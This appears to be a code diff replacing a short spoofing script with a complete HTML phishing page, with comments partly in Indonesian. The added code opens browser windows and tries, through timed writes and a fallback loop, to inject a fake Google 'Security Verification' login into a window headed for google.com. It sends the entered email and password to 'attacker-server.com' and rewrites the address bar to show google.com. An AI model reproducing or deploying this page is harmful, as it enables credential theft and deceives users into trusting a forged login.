@@ -1,29 +1,169 @@
-<script>
-function hybridAndroidSpoof() {
-    // Multi-stage attack untuk Android
-    let win = window.open('about:blank', '_blank');
-    
-    // Stage 1: Set content dulu
-    win.document.write('<h1>Loading...</h1>');
-    
-    // Stage 2: Navigate setelah content set
-    setTimeout(() => {
-        win.location.href = 'https://google.com';
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Legit Site</title>
+    <style>
+        .hidden { display: none; }
+        .overlay { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: white; 
+            z-index: 9999; 
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Facebook</h1>
+    <button onclick="advancedSpoof()">Continue to Google</button>
+
+    <div id="fakePage" class="hidden">
+        <!-- Hidden fake content yang akan di-inject -->
+    </div>
+
+    <script>
+    function advancedSpoof() {
+        // Phase 1: Buka multiple windows untuk bypass protection
+        let win1 = window.open('', '_blank');
+        let win2 = window.open('https://google.com', '_blank');
         
-        // Stage 3: Coba intercept selama navigation
+        // Phase 2: Quick content injection
         setTimeout(() => {
             try {
-                win.document.write(`
-                    <h1>Fake Google Login</h1>
-                    <p>Please re-authenticate:</p>
-                    <input type="text" placeholder="username">
-                    <input type="password" placeholder="password">
-                    <button>Login</button>
-                `);
+                win1.document.write(createFakeGoogle());
+                win1.document.close();
+                
+                // Phase 3: Redirect win2 ke win1 content
+                setTimeout(() => {
+                    win2.location = 'about:blank';
+                    setTimeout(() => {
+                        win2.document.write(createFakeGoogle());
+                        win2.document.close();
+                    }, 50);
+                }, 100);
             } catch(e) {
-                console.log('Intercept failed:', e);
+                console.log('Phase 1 failed:', e);
+                fallbackAttack();
             }
-        }, 150);
-    }, 50);
-}
-</script>
+        }, 30);
+    }
+
+    function createFakeGoogle() {
+        return `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Google</title>
+                <style>
+                    body { 
+                        font-family: Arial, sans-serif; 
+                        margin: 0; 
+                        padding: 20px;
+                        background: #f8f9fa;
+                    }
+                    .google-logo { 
+                        text-align: center; 
+                        font-size: 80px; 
+                        margin: 100px 0 30px;
+                    }
+                    .g { color: #4285f4; }
+                    .o1 { color: #ea4335; }
+                    .o2 { color: #fbbc05; }
+                    .g2 { color: #4285f4; }
+                    .l { color: #34a853; }
+                    .e { color: #ea4335; }
+                    .login-box {
+                        background: white;
+                        padding: 40px;
+                        border-radius: 8px;
+                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                        max-width: 400px;
+                        margin: 0 auto;
+                    }
+                    input {
+                        width: 100%;
+                        padding: 12px;
+                        margin: 10px 0;
+                        border: 1px solid #ddd;
+                        border-radius: 4px;
+                        box-sizing: border-box;
+                    }
+                    button {
+                        width: 100%;
+                        padding: 12px;
+                        background: #1a73e8;
+                        color: white;
+                        border: none;
+                        border-radius: 4px;
+                        cursor: pointer;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="google-logo">
+                    <span class="g">G</span>
+                    <span class="o1">o</span>
+                    <span class="o2">o</span>
+                    <span class="g2">g</span>
+                    <span class="l">l</span>
+                    <span class="e">e</span>
+                </div>
+                
+                <div class="login-box">
+                    <h3>Security Verification Required</h3>
+                    <p>Please re-enter your credentials to continue</p>
+                    <input type="email" id="email" placeholder="Email or phone">
+                    <input type="password" id="password" placeholder="Password">
+                    <button onclick="submitCreds()">Verify Identity</button>
+                    <p style="font-size: 12px; color: #666; margin-top: 20px;">
+                        🔒 Google will protect your personal information
+                    </p>
+                </div>
+
+                <script>
+                    function submitCreds() {
+                        const email = document.getElementById('email').value;
+                        const password = document.getElementById('password').value;
+                        
+                        // Send to attacker server
+                        fetch('https://attacker-server.com/log?e=' + encodeURIComponent(email) + '&p=' + encodeURIComponent(password), {
+                            mode: 'no-cors'
+                        });
+                        
+                        // Show success message
+                        alert('Identity verified successfully! Redirecting...');
+                        window.location.href = 'https://google.com';
+                    }
+                    
+                    // Lock address bar
+                    setInterval(() => {
+                        history.replaceState({}, '', 'https://google.com');
+                    }, 100);
+                <\/script>
+            </body>
+            </html>
+        `;
+    }
+
+    function fallbackAttack() {
+        // Alternative technique kalo yang pertama gagal
+        const win = window.open('https://google.com', 'googleWindow');
+        
+        // Multiple timing attempts
+        const delays = [10, 25, 50, 75, 100, 150, 200];
+        delays.forEach(delay => {
+            setTimeout(() => {
+                try {
+                    win.document.write(createFakeGoogle());
+                    win.document.close();
+                } catch(e) {
+                    // Continue to next attempt
+                }
+            }, delay);
+        });
+    }
+    </script>
+</body>
+</html>
